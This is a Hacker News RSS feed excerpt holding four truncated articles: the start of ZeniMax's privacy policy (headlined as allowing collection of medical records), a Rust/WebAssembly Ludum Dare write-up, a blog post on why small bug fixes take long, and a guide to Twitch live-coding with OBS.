<![CDATA[Doom Eternal Privacy Policy Allows Collection and Disclosure of Medical Records]]>
            </title>
            <description>
<![CDATA[
Score 171 | Comments 132 (<a href="https://news.ycombinator.com/item?id=23836876">thread link</a>) | @gentleman11
<br/>
July 14, 2020 | https://wrap.bnet.idtech.services/legal/?limited=true&fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html | <a href="https://web.archive.org/web/*/https://wrap.bnet.idtech.services/legal/?limited=true&fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<p><img src="https://esrbstorage.blob.core.windows.net/esrbcontent/images/privacy_certified_globe_color.gif" alt="ESRB PRIVACY CERTIFIED MEMBER CONFIRMATION"></p>

<p>Last Updated: January 27, 2020</p>
<p>This ZeniMax Media Online Privacy Policy ("<strong>Policy</strong>") describes how ZeniMax Media Inc. and our affiliates and subsidiaries (collectively, "<strong>ZeniMax</strong>", "<strong>we</strong>" or "<strong>us</strong>") collect, use and otherwise process the personal information we collect about our about customers, purchasers, subscribers, and/or users (each a " <strong>User</strong>") of our mobile applications, games, websites and other online services (collectively, our " <strong>Services</strong>").</p>
<table>
  <tbody><tr>
    <th colspan="3">Overview of Our Collection and Use of Personal Information</th>
  </tr>
  <tr>
    <td colspan="3">This table provides an overview and is intended to summarize key information about our information practices, which are further explained in our Privacy Policy below.  The actual information we collect about you and the use of such personal information will vary depending upon the nature of our relationship and interactions with you. </td>
  </tr>
  <tr>
    <td colspan="2">Categories of personal information collected  </td>
    <td colspan="1">Uses of personal information </td>
  </tr>
  <tr>
    <td colspan="2"><b>Name, contact info and other identifiers</b> (e.g., name, email, address, username and alias; UID, BUID, device id, third party platform identifiers and account details (e.g., PlayStation√Ç¬Æ, Xbox, Steam, Facebook), and other online or unique identifiers)</td>
    <td rowspan="7">
    <ul>
      <li>Providing our Services and related support</li>
      <li>Protecting the integrity of the Services</li>
      <li>Analyzing and improving the Services and our business</li>
      <li>Personalizing the Services</li><li>Advertising, marketing and promotional purposes</li>
      <li>Securing and protecting our business</li>
      <li>Defending our legal rights</li>
      <li>Auditing, reporting, corporate governance, and internal operations</li>
      <li>Complying with legal obligations</li>
    </ul>
</td>
  </tr>
   <tr>
    <td colspan="2"><b>Paper and electronic customer records</b> (e.g., your account and profile, which contains personal information, such as username, name, demographics and other characteristics or descriptions, email, address, telephone number, and other contact information, account credentials, communications preferences, and customer service and support tickets and other records)</td>
  </tr>
   <tr>
    <td colspan="2"><b>Purchase history and tendencies</b> (e.g., information about your subscriptions current and past payments and purchases, and your purchase tendencies)</td>
  </tr>
   <tr>
     <td colspan="2"><b>Usage data</b> (e.g., usage and preference details related to your use of the Services, such as language, in-game purchases, game-play statistics, scores, persona, characters, achievements, rankings, time spent playing, click paths, game profile, preferences and friends)</td>
  </tr>
  <tr>
    <td colspan="2"><b>Geolocation data</b> (e.g., for mobile games users)</td>
  </tr>
   <tr>
    <td colspan="2"><b>Audio, video and other electronic data</b> (e.g., call recordings of customer support calls, and User photos submitted to the Services)</td>
  </tr>
   <tr>
    <td colspan="2"><b>Profiles and inferences</b> (e.g., profiles based on your account and activities, that reflect your preferences, characteristics, and abilities related to the Services)</td>
  </tr>
   <tr>
    <td colspan="3"><b>ESRB Privacy certification.</b> ZeniMax values the importance of your privacy and has received the ESRB Privacy Certification. ZeniMax is a valid licensee, and participating member of the Entertainment Software Rating Board's Privacy Certified Program (√¢‚Ç¨≈ì<b>ESRB Privacy Certified</b>√¢‚Ç¨ÔøΩ). All Services where this Policy is posted and which display an ESRB certification seal have been reviewed and certified by ESRB Privacy Certified to meet established online information collection, use and disclosure practices. As a licensee of this privacy program, we are subject to audits of our Services and other enforcement and accountability mechanisms administered independently by the ESRB.</td>
  </tr>
    <tr>
      <td colspan="3"><b>Individual rights.</b> Please see Section 12. User Rights and Choices below for a description of the choices we provide and the rights you have regarding your personal information. If you are a California resident, please be sure to review Section 15.a.  <u>Additional information for California Residents</u> below for important information about the categories of personal information we collect and disclose and your rights under California privacy laws.  If you are in the European Economic Area, please see Section 15.b. <u>Users in the European Economic Area</u> for more information about your rights under the EU General Data Protection Regulation (GDPR).</td>
  </tr>
</tbody></table>

<p>Scope of Our Policy</p>
<p>Personal Information We Collect</p>
<p>Purposes of Use and Legal Bases for Processing of Personal Information</p>
<p>Disclosure and Sharing of Personal Information</p>
<p>Cookies, Analytics and Personalization</p>
<p>Interest-based Advertising</p>
<p>Third Party Links and Features</p>
<p>User Generated Content</p>
<p>Security of Your Information</p>
<p>Data Retention</p>
<p>International Transfers of Data</p>
<p>User Rights and Choices</p>
<p>Contact Details</p>
<p>Changes to this Policy</p>
<p>Additional Information for Users in Certain Jurisdictions</p>
<p><strong>1.</strong>  <strong>Scope of Our Policy</strong></p>
<p>This Policy applies to the personal information that ZeniMax collects and processes about Users related to our Services, including games published by Bethesda Softworks and ZeniMax Online Studios, and games developed by other ZeniMax studios; more information about our studios is available at www.zenimax.com/studios.  This Policy does not apply to any third party websites, services, products or mobile applications maintained by other companies, which are linked to from our Services.</p>
<p>By registering for an account with us, providing your information to us through the Services, or otherwise using any of our Services, you understand and acknowledge that ZeniMax may process your personal information in accordance with this Policy. If you do not want this Policy to apply to you, please do not use the Services or communicate with us via the Services. If required by applicable law, we will obtain your consent to our collection, use, transfer and disclosure of your personal information.</p>
<p><strong>Personal Information.</strong>  In this Policy, our use of the term "personal information" includes other similar terms under applicable privacy laws√¢‚Ç¨‚Äùsuch as "personal data" and "personally identifiable information."  In general, personal information includes any information that identifies, relates to, describes, or is reasonably capable of being associated, or reasonably linked or linkable with a particular individual.</p>
<p><strong>Not Covered by this Policy.</strong>  This Policy does not apply to job applicants and candidates who apply for employment with us, or to employees and non-employee workers in the context of our working relationship with them.</p>
<p><strong>2.</strong>  <strong>Personal Information We Collect</strong></p>
<p>The information we collect about Users varies depending upon the circumstances and the Services used.</p>
<p>ZeniMax collects personal information directly from Users, automatically related to the use of the Services, and in some cases, from third parties (such as social networks, platform providers, payment processors, and operators of certain third party services that we use).</p>
<p><strong>Information We Collect From You</strong>.  Generally, we collect your personal information on a voluntary basis. However, if you decline to provide certain personal information that is marked mandatory, you may not be able to access certain Services or we may be unable to fully respond to your inquiry. We collect the following personal information from you:</p>
<ul>
<li>
<p>Registration and Profile Information.  To access and use certain Services (e.g., to register a game, download or use a mobile application, access subscription-based Services, create an account) you may be required to register with us, by providing us with certain required information, which is identified on the registration page. Depending upon the Services you use, this may include your name, a username and password, as well as country of residence, email, and contact information; certain Services will not be available if you decline to provide required information. We may also ask you or allow you to submit certain optional information, which may include your phone number, birthdate, location, preferences, a photo or avatar, and other profile information.</p>
</li>
<li>
<p>Purchases and Payments Information.  If you make a purchase or sign up for certain subscription-based Services, you are required to provide your payment information, including name, billing and shipping address and details, payment type, as well as credit card number or other payment account details (e.g., PayPal). We work with third parties like payment processors and fulfillment partners to process these payments. We do not collect, receive, process or store credit card or debit card numbers, or other third-party payment account credentials (e.g., PayPal); this information is collected directly by these third parties. Depending upon the Service, we may receive your username, name, email, the payment type, product(s) or service(s), and other transaction details, and maintain records of your purchase and subscription history.</p>
</li>
<li>
<p>Marketing, Contests and Promotions.  Users can sign up online or in-person (e.g., at tradeshows, conferences and the like) to receive direct marketing communications from us, including emails about game launches, developments, and upcoming releases. If you agree to receive direct marketing communications from us, we collect your email address, and we may also collect your name, preferences, and if relevant, information about your account and the Services and other games you use. We may also run contests, sweepstakes or other events or activities (collectively, "events") on our websites and social media channels. Information collected for these events may include your name, age, email address, and other information.</p>
</li>
<li>
<p>Your Communications.  When you email us, call us, or otherwise send us communications regarding the Services, we collect and maintain a record of your contact details, communications and our responses. We may also maintain records of the in-game communications and information that you post in chat sessions, forums, and in other areas of the Services.</p>
</li>
</ul>
<p><strong>Information We Collect and Receive From Third Parties</strong>.  We may collect and receive personal information about you from third parties, such as:</p>
<ul>
<li>
<p>Third Party Platforms.  You may be able to login through or connect certain third party accounts (each a " <strong>Third Party Account</strong>")√¢‚Ç¨‚Äùsuch as Steam, Twitch, Xbox Live, PSN and Facebook√¢‚Ç¨‚Äùto your account with us.  These Third Party Accounts are operated and managed by third ‚Ä¶</p></li></ul></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wrap.bnet.idtech.services/legal/?limited=true&amp;fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html">https://wrap.bnet.idtech.services/legal/?limited=true&amp;fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html</a></em></p>]]>
            </description>
            <link>https://wrap.bnet.idtech.services/legal/?limited=true&amp;fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23836876</guid>
            <pubDate>Tue, 14 Jul 2020 19:49:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ludum Dare in 48 hours with Rust and WebAssembly]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23836386">thread link</a>) | @yannikyeo
<br/>
July 14, 2020 | https://ianjk.com/rust-gamejam/ | <a href="https://web.archive.org/web/*/https://ianjk.com/rust-gamejam/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <p><a href="https://ldjam.com/">Ludum Dare</a>, the world's premiere 48 hour solo gamejam, occurred back in April.</p>
<p>Ludum Dare has two tracks: the 'Compo' and the 'Jam'.</p>
<p>The rules of the Compo require you to make a game (other than source code) within 48 hours. At the end your fellow entrants will rate your game and your game will be ranked against your peers.</p>
<p>With everyone quarantined at home due to Coronavirus this April's Ludum Dare had vastly more entrants than usual. A total of 1383 people entered the Compo and there were 3576 entries to the Jam. That's an absurd amount of games!</p>
<p>I've entered the Compo a <a href="https://ldjam.com/events/ludum-dare/43/blueberry-bounce">few</a> <a href="https://ldjam.com/events/ludum-dare/42/noahs-help-1">times</a> using Unity, but this time around I wanted to write a game purely with the relatively new programming language Rust.</p>
<p>This post started out focused on the experience of using Rust, but turned into a general overview of the technical and design process for the game.</p>
<span id="continue-reading"></span>
<p><a href="https://www.rust-lang.org/">Rust</a> is a 'systems programming language' focused on performance and safety. 'Safety' means that Rust helps you avoid certain classes of vulnerabilities and crashes. I have been using Rust for my personal work and decided now was the time to give it a shot for a gamejam.</p>
<h2 id="why-not-unity">Why not Unity?</h2>
<p>I've entered at least five past Ludum Dares with Unity, and Unity with C# is by far the most common set of tools used for Ludum Dare. But I just simply haven't been enjoying Unity as much recently.</p>
<p>Unity is a giant game engine, but I find it hard to get into a flow state with. There are too many knobs, features, and ways to do things. It's easy to flip a bunch of switches and have something decent, but that just doesn't mesh with my personal design flow. I prefer to work in a clean mental environment, not a complex editor.</p>
<p>Additionally Unity's WebGL build takes around 20 minutes on my laptop, which is absolutely miserable.</p>

<p>I've been coding exclusively on a 2016 Macbook Pro for a while now. It's not the best, but not the worst.</p>
<p>I could have used an existing Rust game engine, but I'm not familiar with the popular ones. Instead I cobbled together a mix of Rust libraries and various personal Rust scripts.</p>
<p>Rust makes it trivially easy to use other libraries (which it calls crates) through its package manager <a href="https://crates.io/">crates.io</a>.</p>
<p>For this project I used the following crates:</p>
<ul>
<li><a href="https://github.com/kettle11/kApp">kApp</a> My personal windowing and input library designed to build super fast.</li>
<li><a href="https://github.com/rustwasm/wasm-bindgen">wasm-bindgen</a> The Rust ecosystem's standard way to call Javascript from Rust</li>
<li><a href="https://github.com/grovesNL/glow">glow</a> "GL on whatever" A wrapper around OpenGL and WebGL.</li>
</ul>
<p>The recommended way to work with Rust and WebAssembly (Wasm) is through a command line tool called <a href="https://github.com/rustwasm/wasm-pack"><code>wasm-pack</code></a>. I skipped using <code>wasm-pack</code> and instead just used a two line bash script that would run a Rust build and then call <code>wasm-bindgen</code> directly to generate the web bindings.</p>
<p>Quick iteration times are absolutely critical for a gamejam. The following tools were instrumental in attaining quick iteration times:</p>
<ul>
<li><a href="https://github.com/passcod/cargo-watch"><code>cargo watch</code></a> ran the build script automatically whenever the code was saved.</li>
<li><a href="https://crates.io/crates/devserver/0.1.0"><code>devserver</code></a> hosted the local web page and automatically reloaded it when a file changed</li>
<li>Visual Studio Code was configured to automatically save</li>
</ul>
<p>The combination of <code>cargo watch</code>, <code>devserver</code>, and the Visual Studio Code settings meant that I could edit a value, like a color, in my Rust code and watch it change on the web page nearly instantly.</p>
<p>Typical Rust build times were around 1-3 seconds while working on this project, but sometimes they'd inexplicably go up to around 10 seconds. Rust is known for slow build times, and these quick iteration times were only possible by carefully choosing tiny crates. My goal was to always have the new build ready on the web page by the time I changed to the browser window.</p>
<h2 id="code-structure">Code Structure</h2>
<p>With only 48 hours best practices go out the window, but even still I made some early choices to help make writing new code as easy as possible. One of the key things I wanted to ensure was that if I were to declare a new variable, or load a new asset, that it would only have to be declared once. Many Rust frameworks follow a pattern a bit like the following:</p>
<pre><code><span>struct </span><span>Game </span><span>{
    </span><span>player</span><span>:</span><span> Player,
    </span><span>/* Other stuff */
</span><span>}

</span><span>impl </span><span>Game </span><span>{
    </span><span>fn </span><span>setup</span><span>(</span><span>context</span><span>: &amp;</span><span>Context</span><span>) -&gt;</span><span> Game </span><span>{</span><span>
        Game </span><span>{</span><span>
            player</span><span>: </span><span>Player</span><span>::</span><span>new</span><span>(),
        }
    }

    </span><span>fn </span><span>update</span><span>(</span><span>context</span><span>: &amp;</span><span>Context</span><span>) {
        </span><span>/* Respond to user input and redraw here*/
    </span><span>}
}
</span></code></pre>
<p>The above works fine in regular scenarios, but when you add a new variable like 'player' it needs to be declared in multiple places. Instead I used a structure a bit like the following:</p>
<pre><code><span>fn </span><span>main</span><span>() {
    </span><span>let</span><span> player </span><span>= </span><span>Player</span><span>::</span><span>new</span><span>();
    </span><span>/* Other setup code here */

    </span><span>loop </span><span>{
        </span><span>/* Respond to user input and redraw here forever*/
    </span><span>}
}
</span></code></pre>
<p>This let me declare a variable and use it immediately, no extra fuss.</p>
<h2 id="async">Async</h2>
<p>Unfortunately the above structure doesn't work on web. On Web the main loop must return control to the browser.</p>
<p>The way to get around this is to pass a closure that the browser calls when an event occurs:</p>
<pre><code><span>fn </span><span>main</span><span>() {
    </span><span>let</span><span> player </span><span>= </span><span>Player</span><span>::</span><span>new</span><span>();
    </span><span>/* Other setup code here */

    </span><span>run</span><span>(</span><span>move </span><span>|</span><span>context</span><span>| {
        </span><span>/* Respond to events and draw here */
    </span><span>});
}
</span></code></pre>
<p>Rust windowing and input frameworks like <a href="https://github.com/rust-windowing/winit">Winit</a> use the above approach.</p>
<p>Another issue on web is loading assets. On non-web platforms it's simple to just wait for an asset to be done loading:</p>
<pre><code><span>let</span><span> wind_sound_handle </span><span>= </span><span>std</span><span>::</span><span>fs</span><span>::</span><span>read</span><span>("</span><span>wind.wav</span><span>").</span><span>unwrap</span><span>();
</span></code></pre>
<p>On web the above isn't possible because it would prevent returning control to the browser. It's not appropriate to lock up while waiting for an an asset to return from a server, so all loads are asynchronous.</p>
<p>An approach like the following could be used in Rust:</p>
<pre><code><span>let</span><span> wind_sound_handle </span><span>= </span><span>fetch_asset</span><span>("</span><span>wind.wav</span><span>");

</span><span>run</span><span>(</span><span>move </span><span>|</span><span>context</span><span>| {
    </span><span>let</span><span> wind_sound </span><span>= </span><span>None</span><span>;
    </span><span>/* Respond to events and draw requests here */
    </span><span>if let </span><span>Some</span><span>(</span><span>loaded_asset</span><span>) =</span><span> wind_sound_handle</span><span>.</span><span>get_asset</span><span>() {</span><span>
        window_sound </span><span>=</span><span> loaded_asset</span><span>;
    }

    </span><span>/* Respond to events and draw here */
</span><span>});
</span></code></pre>
<p>But that approach can lead to tedious bookkeeping, which is the opposite of what you want for a gamejam.</p>
<p>Instead I decided to use Rust's relatively new feature: <code>async</code>. Fortunately I had recently added <code>asyc</code> support to <code>kApp</code>.</p>
<p>Rust's <code>async</code> feature generates a state machine for a function that allows it to pause and later resume when ready.</p>
<p>An <code>async</code> function can look very similar to a traditional infinite game loop:</p>
<pre><code><span>async </span><span>fn </span><span>run</span><span>(</span><span>app</span><span>:</span><span> Application, </span><span>events</span><span>:</span><span> Events</span><span>) {
    </span><span>let</span><span> wind_sound </span><span>= </span><span>audio</span><span>::</span><span>load_audio</span><span>("</span><span>wind.wav</span><span>").</span><span>await</span><span>.</span><span>unwrap</span><span>();
    </span><span>loop </span><span>{
        </span><span>match</span><span> events</span><span>.</span><span>next_event</span><span>().</span><span>await </span><span>{
            </span><span>/* Respond to events and draw here */
        </span><span>}
    }
}
</span></code></pre>
<p>This let me load assets with one line and not have to worry about any bookkeeping. Perfect!</p>
<h2 id="game-design">Game Design</h2>
<p>The theme for this Ludum Dare was "Keep It Alive" which immediately struck me as overly morbid given the rapid spread of coronavirus. I couldn't motivate myself to create a game about death, and I nearly decided to quit the jam entirely.</p>
<p>Instead I looked for alternative ways to interpret the theme. As I stared out my apartment window towards San Francisco hills I thought about the way people droop their heads as they walk to and from work. It's a beautiful world, but it's tough to notice the beauty every day when the routine of life weighs heavy.</p>
<p>What if you played as a spirit to lift people up? You could keep their "wonder" alive. You'd play as some sort of spirit and perhaps you'd lift a commuter bicyclist up into the sky where you'd whisk them around and show them the stars.</p>
<p>I imagined you'd guide the bicyclist through the sky to collect stars and people on the ground would notice and point up in awe.</p>
<p>It was difficult to figure out how to pair that idea to gameplay, but what I settled upon was a game inspired by the old school flash game <a href="https://www.linerider.com/">Line Rider</a>.</p>
<p>You'd draw lines for the bicyclist and they'd roll along those lines and bump into collectible stars.</p>
<h2 id="implementation">Implementation</h2>
<p>The plan was to implement the physics of the character as a rolling ball and then substitute in character art for the bicyclist.</p>
<p>The first thing I needed was line rendering. I ripped some code out of a prior Rust project that would generate mesh line segments by creating rectangles with circles at the ends. I wasn't sure if this heavy-handed approach to line joins would cause problems. Each individual line segment was made up of a bunch of triangles so I felt that perhaps the game would lag as too many lines appeared.</p>
<p>I stress tested this by scribbling the entire screen full of lines over and over, and I was shocked when the framerate didn't drop at all.</p>
<p>For the physics I took some math for finding the closest point on a line to the ball. If the point is inside the ball then check if the ball's velocity is moving towards the point. If the ball is moving towards the point then "bounce" the ball by pushing the opposite direction on the ball.</p>
<p>The heart of the collision code wasn't very long at all:</p>
<pre><code><span> </span><span>fn </span><span>check_lines</span><span>(&amp;</span><span>mut </span><span>self</span><span>, </span><span>points</span><span>: &amp;</span><span>[Vector3]</span><span>) {
    </span><span>let</span><span> len </span><span>=</span><span> points</span><span>.</span><span>len</span><span>();

    </span><span>for</span><span> i </span><span>in (</span><span>1</span><span>..</span><span>len</span><span>).</span><span>step_by</span><span>(</span><span>2</span><span>) {
        </span><span>let </span><span>(</span><span>distance</span><span>,</span><span> p</span><span>) = </span><span>point_with_line_segment</span><span>(</span><span>self</span><span>.</span><span>position</span><span>,</span><span> points</span><span>[</span><span>i </span><span>- </span><span>1</span><span>],</span><span> points</span><span>[</span><span>i</span><span>]);

        </span><span>if</span><span> distance
            </span><span>&lt; (</span><span>self</span><span>.</span><span>radius </span><span>+ </span><span>LINE_RADIUS </span><span>- </span><span>0.001</span><span>/* Allow ball to sink slightly into surface*/</span><span>)
        {
            </span><span>let</span><span> normal_of_collision </span><span>= (</span><span>self</span><span>.</span><span>position </span><span>-</span><span> p</span><span>).</span><span>normal</span><span>();
            </span><span>let</span><span> velocity_along_collision </span><span>= </span><span>Vector3</span><span>::</span><span>dot</span><span>(</span><span>normal_of_collision</span><span>, </span><span>self</span><span>.</span><span>velocity</span><span>);
            </span><span>if</span><span> velocity_along_collision </span><span>&lt; </span><span>0.0 </span><span>{
                </span><span>self</span><span>.</span><span>velocity </span><span>-=</span><span> normal_of_collision </span><span>*</span><span> velocity_along_collision </span><span>* </span><span>1.4</span><span>;
            }
            </span><span>self</span><span>.</span><span>position </span><span>+=</span><span> normal_of_collision </span><span>* </span><span>0.0001</span><span>;
        }
    }
}
</span></code></pre>
<p>(The code could have been a little cleaner had I known about the <a href="https://doc.rust-lang.org/std/primitive.slice.html#method.chunks">chunks</a> method on iterators.)</p>
<p>I was pretty surprised at how great the ball physics felt without much tuning. When I started with this design the physics felt like a big unknown for me. I felt like I might not be able to get them right within the 48 hour window, but coding the physics was actually one of the shortest features in the project.</p>
<p>I was pretty concerned that the ‚Ä¶</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ianjk.com/rust-gamejam/">https://ianjk.com/rust-gamejam/</a></em></p>]]>
            </description>
            <link>https://ianjk.com/rust-gamejam/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23836386</guid>
            <pubDate>Tue, 14 Jul 2020 19:14:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You've only added two lines ‚Äì why did that take two days?]]>
            </title>
            <description>
<![CDATA[
Score 918 | Comments 501 (<a href="https://news.ycombinator.com/item?id=23835918">thread link</a>) | @gregdoesit
<br/>
July 14, 2020 | https://www.mrlacey.com/2020/07/youve-only-added-two-lines-why-did-that.html | <a href="https://web.archive.org/web/*/https://www.mrlacey.com/2020/07/youve-only-added-two-lines-why-did-that.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="pagepbt">
<!-- #masthead -->
<div id="contentpbt">
<div id="primarypbt">
<div id="mainpbt" role="main">
<div id="mainblogsec"><div data-version="1" id="Blog1">
<div>
<!--Can't find substitution for tag [defaultAdStart]-->

          <div>
        


          <div>
        
<div>
<article itemprop="blogPost" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
<a name="8378966868534474355"></a>


<div id="post-body-8378966868534474355" itemprop="articleBody"><p>
It might seem a reasonable question, but it makes some terrible assumptions:</p><ul>
<li>lines of code = effort</li>
<li>lines of code = value</li>
<li>all lines of code are equal</li>
</ul>

<p>
Why did a fix that seems so simple when looking at the changes made take two days to complete?</p>
<div>
<ul>
<li><b>Because the issue was reported with a vague description of how to recreate it.</b> It took me several hours to get to a reliable reproduction of the item. Some developers would have immediately gone back to the person reporting the problem and required more information before investigating. I try and do as much as I can with the information provided. I know some developers don't like having to fix bugs, and so do whatever they can to get out of it. Claiming there isn't enough is a great way to look like you're trying to help but not have to do anything. I know that reporting errors can be hard, and I'm grateful for anyone who does. I want to show appreciation for error reports by trying to do as much as possible with the information provided before asking for more details.</li>
<li><b>Because the reported issue was related to functionality, I'm not familiar with.</b>&nbsp;The feature it was to do with was something I rarely use and is not something I've ever used in great detail. This meant it took me longer than it might to understand how to use it and the nuances of how it interacts with the software with the bug.</li>
<li><b>Because I took the time to investigate the real cause of the issue, not just looking at the symptoms</b>. If some code is throwing an error, you could just wrap it in a try..catch statement and suppress the error. No error, no problem. Right? Sorry, for me, making the problem invisible isn't the same as fixing it. "Swallowing" an error can easily lead to other unexpected side-effects. I don't want to have to deal with them at a point in the future.</li>
<li><b>Because I investigated if there were other ways of getting to the same problem, not just the reported reproduction steps</b>. One set of reproduction steps can easily make the error appear to be in one place when it may actually be more deep-seated. Finding the exact cause of a problem, and looking at all the ways to get there can provide valuable insights. Insights such as how the code is actually used, where there might be other places with possible (other?) problems that might need addressing, or it may show inconsistencies in the code that mean an error is caused (or handled) in one code path but not another.</li>
<li><b>Because I took the time to verify if there were other parts of the code that might be affected in similar ways</b>. If a mistake led to the bug, the same error could have also been made elsewhere in the code-base. Now's a great time to check.&nbsp;</li>
<li><b>Because when I found the cause of the issue, I looked to find the simplest way of fixing it that would have minimal risk of introducing side-effects</b>. I don't want the quickest possible fix. I want a fix that isn't likely to cause confusion or other problems in the future.</li>
<li><b>Because I tested the change thoroughly and verified that it addressed the problem for all the different code paths that were affected</b>. I don't want to rely on someone else to have to test that what I've done is correct. I don't want a bug to be found in the future and for me to have to come back to this code when I've mentally moved on. Context switching is expensive and frustrating. Having a dedicated tester have to look at the "same" change again is something I want to avoid whenever possible.</li>
</ul>

</div>
<div><p>
I don't like having to fix bugs. Partly because they can feel like the result of a previous failure on my part. The other reason I don't like fixing bugs is that I'd prefer to be working on new things.</p><p>

What's worse than having to fix a bug?<br>
Having to fix the same bug repeatedly.<br>
I take the time to make sure any bug is totally fixed any time it is encountered so that it doesn't need to be faced, investigated, fixed, and tested more than once.</p></div>





</div>

<div>
<p><span>
<span>
<a href="https://www.blogger.com/email-post.g?blogID=33176002&amp;postID=8378966868534474355" title="Email Post">
<img alt="" height="13" src="https://img1.blogblog.com/img/icon18_email.gif" width="18">
</a>
</span>
</span></p>

</div>





</article>




</div>

        </div></div>
      
<!--Can't find substitution for tag [adEnd]-->
</div>

</div></div>
</div><!-- #main -->
</div><!-- #primary -->
<!-- #secondary -->
</div><!-- #content -->
<!-- #colophon -->
</div></div>]]>
            </description>
            <link>https://www.mrlacey.com/2020/07/youve-only-added-two-lines-why-did-that.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23835918</guid>
            <pubDate>Tue, 14 Jul 2020 18:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Run a Live Coding Stream on Twitch Using OBS]]>
            </title>
            <description>
<![CDATA[
Score 475 | Comments 182 (<a href="https://news.ycombinator.com/item?id=23834153">thread link</a>) | @jordanlewis
<br/>
July 14, 2020 | https://jordanlewis.org/posts/twitch-live-coding/ | <a href="https://web.archive.org/web/*/https://jordanlewis.org/posts/twitch-live-coding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<article>
		
		

		<section>
    <div>
      <p><img src="https://jordanlewis.org/images/stream/streaming-desk.jpg" alt="Stream software picture"></p>
<p>If you‚Äôre reading this post, you might be interested in trying your hand at
live coding on stream, as a way of sharing your projects in a more relatable,
immediate way than a polished blog post, teaching others about programming, or
just as a way to have fun. I think that live coding and streams in general are
an interesting possible future form of both education and entertainment, and if
you‚Äôre contemplating starting your own stream, I sincerely hope that you do it.</p>
<p>This month marks the 6 month anniversary of the first stream on <a href="https://twitch.tv/large__data__bank">LARGE DATA
BANK</a>, my Twitch live coding channel. It‚Äôs
grown from a one-off Friday experiment into a regularly scheduled part of my
life, a community of dozens of wonderful regular viewers and chatters, and
an activity that‚Äôs one of the top things I look forward to doing every week.</p>
<p>I‚Äôve learned a lot along the way, and this detailed guide to the way I‚Äôve
set up my stream is my attempt at stepping back and sharing those learnings in
the hopes of inspiring others to try this awesome hobby for themselves. I hope
it‚Äôs useful for you as you start your own journey into streaming.</p>
<p>If you have any questions that aren‚Äôt answered in this blog post, I‚Äôm more than
happy to answer them <a href="https://twitter.com/JordanALewis">on Twitter</a> or
<a href="https://jordanlewis.org/">elsewhere online</a>.</p>
<p>Also, please send me a follow on <a href="https://largedatabank.com/">Twitch</a> and
<a href="https://twitter.com/JordanALewis">Twitter</a> for stream notifications! I stream
every Friday at 3 PM ET, and most Sundays at some time in the afternoon.</p>
<nav id="TableOfContents">
  <ul>
    <li><a href="#intro">Intro</a></li>
    <li><a href="#obs-configuration">OBS configuration</a>
      <ul>
        <li><a href="#scenes">Scenes</a></li>
        <li><a href="#video">Video</a></li>
        <li><a href="#audio">Audio</a></li>
        <li><a href="#streaming-to-twitch-finally">Streaming to Twitch (finally)</a></li>
      </ul>
    </li>
    <li><a href="#stream-alerts">Stream Alerts</a>
      <ul>
        <li><a href="#sound-in-stream-alerts">Sound in Stream Alerts</a></li>
      </ul>
    </li>
    <li><a href="#channel-setup">Channel setup</a>
      <ul>
        <li><a href="#stream-category-and-tags">Stream Category and Tags</a></li>
        <li><a href="#panels">Panels</a></li>
        <li><a href="#emotes">Emotes</a></li>
        <li><a href="#banner-image">Banner image</a></li>
        <li><a href="#saving-videos">Saving Videos</a></li>
      </ul>
    </li>
    <li><a href="#chatbot">Chatbot</a></li>
    <li><a href="#becoming-a-twitch-affiliate">Becoming a Twitch Affiliate</a></li>
    <li><a href="#shoutouts">Shoutouts</a></li>
  </ul>
</nav>


<p>Whatever your reasons for wanting to try streaming, there‚Äôs quite a bit of setup
that you‚Äôll need to do up front to try it out that can feel daunting. Everyone
has to go through this initial setup period, though, and so can you. You got
this!</p>
<p>The most important part of this post is the
<a href="#obs-configuration">section</a> about
<a href="https://obsproject.com/">OBS</a>, which is the awesome, cross-platform, free and
open source streaming software that most of the community uses. OBS will be
your best friend on your streaming journey! You will use it to control your
webcam, desktop, audio, and every other element that goes into the final
product of your livestream.</p>
<p>The rest of the post focuses on configuration that‚Äôs more specific to Twitch.
I like to use Twitch because I like the culture that‚Äôs developed there over
time, but plenty of people think that YouTube Live is more appropriate for
professional content. I‚Äôm not too familiar with YouTube Live, but most of the
discussion about OBS should apply the same for YouTube as it does for Twitch:
the main difference is that you‚Äôll configure OBS to send to your YouTube
account instead of Twitch in Stream settings.</p>
<blockquote>
<p><strong><em>Yo!</em> If you‚Äôre trying to set up your very first stream</strong>, you really
don‚Äôt need most of the stuff in this guide, which represents what I‚Äôve built
gradually over the past 6 months, stream by stream. My recommendation for the
livecoding-curious is to try streaming with a bare-bones setup, to see how
you like it, before investing in expensive gear or diving into hours of
configuration and asset creation. You can accomplish this in several hours
over a weekend. Set up a single scene in OBS with your captured desktop as
the background and your webcam in the corner, with your microphone configured
under Mic/Aux. That‚Äôs all you need: a simple setup for streaming your coding
is now yours! I‚Äôll cover how to make that happen below, in the OBS
Configuration section. Just ignore most of the extra scenes and various bells
and whistles, and you‚Äôll be good to go.</p>
</blockquote>

<p><a href="https://obsproject.com/">OBS</a> is where you‚Äôll produce everything that your
viewers can see and hear on the live video, including your desktop, the camera
with your beautiful face on it, your voice, and any stream alerts, overlays,
text, or other information that you might want to show to your viewers.</p>
